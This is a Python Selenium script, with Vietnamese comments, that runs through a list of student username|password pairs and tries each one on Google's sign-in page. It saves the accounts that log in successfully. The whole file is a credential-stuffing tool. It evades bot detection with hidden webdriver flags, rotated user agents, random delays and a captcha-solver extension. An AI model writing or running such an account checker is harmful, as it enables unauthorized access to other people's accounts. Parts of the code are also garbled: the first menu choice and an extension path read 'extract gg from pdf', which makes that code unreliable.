#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import time
import json
import os
import random
from datetime import datetime
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.common.exceptions import TimeoutException, NoSuchElementException, WebDriverException

class GoogleLoginChecker:
    def __init__(self):
        self.driver = None
        self.successful_accounts = []
        self.failed_accounts = []
        self.blocked_accounts = []
        self.results_file = "successful_google_accounts.txt"
        self.failed_file = "failed_google_accounts.txt"
        self.blocked_file = "blocked_google_accounts.txt"
        self.log_file = "google_login_log.txt"
        
    def setup_driver(self, headless=False):
        """Thiết lập Chrome driver với các options cần thiết"""
        try:
            chrome_options = Options()
            
            if headless:
                chrome_options.add_argument('--headless')
            
            # Các options để tránh detection
            chrome_options.add_argument('--no-sandbox')
            chrome_options.add_argument('--disable-dev-shm-usage')
            chrome_options.add_argument('--disable-blink-features=AutomationControlled')
            chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
            chrome_options.add_experimental_option('useAutomationExtension', False)
            
            # User agent ngẫu nhiên
            user_agents = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            ]
            chrome_options.add_argument(f'--user-agent={random.choice(user_agents)}')
            
            # Load extensions nếu có
            if os.path.exists('driver/1.crx'):
                chrome_options.add_extension('driver/extract gg from pdf.crx')
            if os.path.exists('driver/captchasolver.crx'):
                chrome_options.add_extension('driver/captchasolver.crx')
            
            # Chrome driver path
            driver_path = 'driver/chromedriver.exe'
            if not os.path.exists(driver_path):
                driver_path = 'chromedriver.exe'
            
            # Sử dụng Service thay vì executable_path
            if os.path.exists(driver_path):
                chrome_service = Service(driver_path)
                self.driver = webdriver.Chrome(service=chrome_service, options=chrome_options)
            else:
                # Nếu không tìm thấy chromedriver, thử không dùng service
                self.driver = webdriver.Chrome(options=chrome_options)
            
            self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            
            self.log("✅ Chrome driver đã được khởi tạo thành công")
            return True
            
        except Exception as e:
            self.log(f"❌ Lỗi khởi tạo driver: {e}")
            return False
    
    def log(self, message):
        """Ghi log và in ra console"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_message = f"[{timestamp}] {message}"
        print(log_message)
        
        try:
            with open(self.log_file, 'a', encoding='utf-8') as f:
                f.write(log_message + '\n')
        except:
            pass
    
    def load_accounts(self, file_path="students_accounts.txt"):
        """Đọc danh sách tài khoản từ file"""
        accounts = []
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                lines = f.readlines()
            
            for line in lines:
                line = line.strip()
                if '|' in line:
                    username, password = line.split('|', 1)
                    accounts.append((username.strip(), password.strip()))
            
            self.log(f"📚 Đã tải {len(accounts)} tài khoản từ {file_path}")
            return accounts
            
        except Exception as e:
            self.log(f"❌ Lỗi đọc file {file_path}: {e}")
            return []
    
    def check_login(self, username, password, timeout=30):
        """Kiểm tra đăng nhập một tài khoản"""
        try:
            # Mở trang đăng nhập Google
            self.driver.get("https://accounts.google.com/signin")
            time.sleep(random.uniform(2, 4))
            
            # Nhập email
            try:
                email_input = WebDriverWait(self.driver, timeout).until(
                    EC.presence_of_element_located((By.ID, "identifierId"))
                )
                email_input.clear()
                email_input.send_keys(username)
                time.sleep(random.uniform(1, 2))
                
                # Nhấn Next
                next_button = self.driver.find_element(By.ID, "identifierNext")
                next_button.click()
                time.sleep(random.uniform(3, 5))
                
            except Exception as e:
                self.log(f"❌ Lỗi nhập email: {e}")
                return "error"
            
            # Kiểm tra có báo lỗi email không
            try:
                error_elements = self.driver.find_elements(By.CSS_SELECTOR, '[role="alert"]')
                for error_element in error_elements:
                    error_text = error_element.text.lower()
                    if any(keyword in error_text for keyword in ['email', 'account', 'find', 'exist']):
                        self.log(f"❌ Email không tồn tại: {username}")
                        return "invalid_email"
            except:
                pass
            
            # Nhập password
            try:
                password_input = WebDriverWait(self.driver, timeout).until(
                    EC.element_to_be_clickable((By.NAME, "password"))
                )
                password_input.clear()
                password_input.send_keys(password)
                time.sleep(random.uniform(1, 2))
                
                # Nhấn Next
                password_next = self.driver.find_element(By.ID, "passwordNext")
                password_next.click()
                time.sleep(random.uniform(3, 5))
                
            except Exception as e:
                self.log(f"❌ Lỗi nhập password: {e}")
                return "error"
            
            # Kiểm tra kết quả đăng nhập
            current_url = self.driver.current_url
            
            # Thành công - chuyển đến trang chính của Google
            if "myaccount.google.com" in current_url or "accounts.google.com/signin/oauth" in current_url:
                self.log(f"✅ Đăng nhập thành công: {username}")
                return "success"
            
            # Kiểm tra các lỗi khác
            page_source = self.driver.page_source.lower()
            
            # Sai mật khẩu
            if any(keyword in page_source for keyword in ['wrong password', 'incorrect password', 'sai mật khẩu']):
                self.log(f"❌ Sai mật khẩu: {username}")
                return "wrong_password"
            
            # Tài khoản bị khóa/đình chỉ
            if any(keyword in page_source for keyword in ['suspended', 'disabled', 'locked', 'blocked']):
                self.log(f"⚠️ Tài khoản bị khóa: {username}")
                return "blocked"
            
            # Cần xác minh
            if any(keyword in page_source for keyword in ['verify', 'verification', 'phone', 'recovery']):
                self.log(f"⚠️ Cần xác minh: {username}")
                return "need_verification"
            
            # Captcha
            if any(keyword in page_source for keyword in ['captcha', 'robot', 'unusual traffic']):
                self.log(f"⚠️ Gặp captcha: {username}")
                return "captcha"
            
            self.log(f"❓ Kết quả không xác định: {username}")
            return "unknown"
            
        except TimeoutException:
            self.log(f"⏰ Timeout khi kiểm tra: {username}")
            return "timeout"
        except Exception as e:
            self.log(f"❌ Lỗi kiểm tra {username}: {e}")
            return "error"
    
    def save_results(self):
        """Lưu kết quả vào các file"""
        try:
            # Lưu tài khoản thành công
            if self.successful_accounts:
                with open(self.results_file, 'w', encoding='utf-8') as f:
                    for account in self.successful_accounts:
                        f.write(f"{account[0]}|{account[1]}\n")
                self.log(f"💾 Đã lưu {len(self.successful_accounts)} tài khoản thành công vào {self.results_file}")
            
            # Lưu tài khoản thất bại
            if self.failed_accounts:
                with open(self.failed_file, 'w', encoding='utf-8') as f:
                    for account, reason in self.failed_accounts:
                        f.write(f"{account[0]}|{account[1]}|{reason}\n")
                self.log(f"💾 Đã lưu {len(self.failed_accounts)} tài khoản thất bại vào {self.failed_file}")
            
            # Lưu tài khoản bị khóa
            if self.blocked_accounts:
                with open(self.blocked_file, 'w', encoding='utf-8') as f:
                    for account in self.blocked_accounts:
                        f.write(f"{account[0]}|{account[1]}\n")
                self.log(f"💾 Đã lưu {len(self.blocked_accounts)} tài khoản bị khóa vào {self.blocked_file}")
        
        except Exception as e:
            self.log(f"❌ Lỗi lưu kết quả: {e}")
    
    def run_check(self, max_accounts=None, start_from=0, headless=False):
        """Chạy kiểm tra cho tất cả tài khoản"""
        self.log("🚀 Bắt đầu kiểm tra đăng nhập Google...")
        
        # Thiết lập driver
        if not self.setup_driver(headless):
            self.log("❌ Không thể khởi tạo driver")
            return
        
        # Tải danh sách tài khoản
        accounts = self.load_accounts()
        if not accounts:
            self.log("❌ Không có tài khoản nào để kiểm tra")
            return
        
        # Giới hạn số lượng tài khoản nếu cần
        if max_accounts:
            accounts = accounts[start_from:start_from + max_accounts]
        else:
            accounts = accounts[start_from:]
        
        self.log(f"📊 Sẽ kiểm tra {len(accounts)} tài khoản...")
        
        try:
            for i, (username, password) in enumerate(accounts, 1):
                self.log(f"\n🔍 [{i}/{len(accounts)}] Kiểm tra: {username}")
                
                result = self.check_login(username, password)
                
                if result == "success":
                    self.successful_accounts.append((username, password))
                    self.log(f"✅ Thành công! Tổng cộng: {len(self.successful_accounts)}")
                elif result == "blocked":
                    self.blocked_accounts.append((username, password))
                else:
                    self.failed_accounts.append(((username, password), result))
                
                # Lưu kết quả tạm thời sau mỗi 10 tài khoản
                if i % 10 == 0:
                    self.save_results()
                    self.log(f"💾 Đã lưu kết quả tạm thời...")
                
                # Nghỉ ngẫu nhiên giữa các lần kiểm tra
                if i < len(accounts):  # Không nghỉ ở lần cuối
                    delay = random.uniform(5, 15)
                    self.log(f"⏳ Nghỉ {delay:.1f}s trước khi kiểm tra tài khoản tiếp theo...")
                    time.sleep(delay)
        
        except KeyboardInterrupt:
            self.log("\n⚠️ Đã dừng bởi người dùng")
        except Exception as e:
            self.log(f"❌ Lỗi trong quá trình kiểm tra: {e}")
        finally:
            # Lưu kết quả cuối cùng
            self.save_results()
            
            # In báo cáo tổng kết
            self.print_summary()
            
            # Đóng driver
            if self.driver:
                self.driver.quit()
                self.log("🔒 Đã đóng trình duyệt")
    
    def print_summary(self):
        """In báo cáo tổng kết"""
        self.log("\n" + "="*60)
        self.log("📊 BÁO CÁO TỔNG KẾT")
        self.log("="*60)
        self.log(f"✅ Tài khoản đăng nhập thành công: {len(self.successful_accounts)}")
        self.log(f"❌ Tài khoản thất bại: {len(self.failed_accounts)}")
        self.log(f"⚠️ Tài khoản bị khóa: {len(self.blocked_accounts)}")
        self.log(f"📁 File kết quả: {self.results_file}")
        self.log("="*60)

def main():
    """Hàm main với menu lựa chọn"""
    checker = GoogleLoginChecker()
    
    print("=" * 60)
    print("🔍 GOOGLE LOGIN CHECKER")
    print("=" * 60)
    print("Tool kiểm tra đăng nhập Google với danh sách tài khoản sinh viên")
    print("-" * 60)
    
    while True:
        print("\n📋 MENU LỰA CHỌN:")
        print("extract gg from pdf. Kiểm tra tất cả tài khoản")
        print("2. Kiểm tra số lượng giới hạn")
        print("3. Tiếp tục từ vị trí cụ thể")
        print("4. Chế độ ẩn trình duyệt (headless)")
        print("5. Xem thống kê file tài khoản")
        print("6. Thoát")
        
        choice = input("\n➤ Chọn (extract gg from pdf-6): ").strip()
        
        if choice == "extract gg from pdf":
            checker.run_check()
            break
        elif choice == "2":
            try:
                max_acc = int(input("➤ Nhập số lượng tài khoản cần kiểm tra: "))
                checker.run_check(max_accounts=max_acc)
                break
            except ValueError:
                print("❌ Vui lòng nhập số hợp lệ!")
        elif choice == "3":
            try:
                start = int(input("➤ Bắt đầu từ tài khoản thứ: ")) - 1
                max_acc = input("➤ Số lượng cần kiểm tra (Enter = tất cả): ").strip()
                max_acc = int(max_acc) if max_acc else None
                checker.run_check(max_accounts=max_acc, start_from=start)
                break
            except ValueError:
                print("❌ Vui lòng nhập số hợp lệ!")
        elif choice == "4":
            print("🔇 Chế độ ẩn trình duyệt - không hiển thị cửa sổ Chrome")
            checker.run_check(headless=True)
            break
        elif choice == "5":
            accounts = checker.load_accounts()
            print(f"\n📊 Thống kê file tài khoản:")
            print(f"📁 File: students_accounts.txt")
            print(f"📈 Tổng số tài khoản: {len(accounts)}")
            if accounts:
                print(f"🔤 Ví dụ: {accounts[0][0]}|{accounts[0][1]}")
        elif choice == "6":
            print("👋 Tạm biệt!")
            break
        else:
            print("❌ Lựa chọn không hợp lệ!")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n👋 Đã dừng chương trình!")
    except Exception as e:
        print(f"\n❌ Lỗi không mong đợi: {e}") 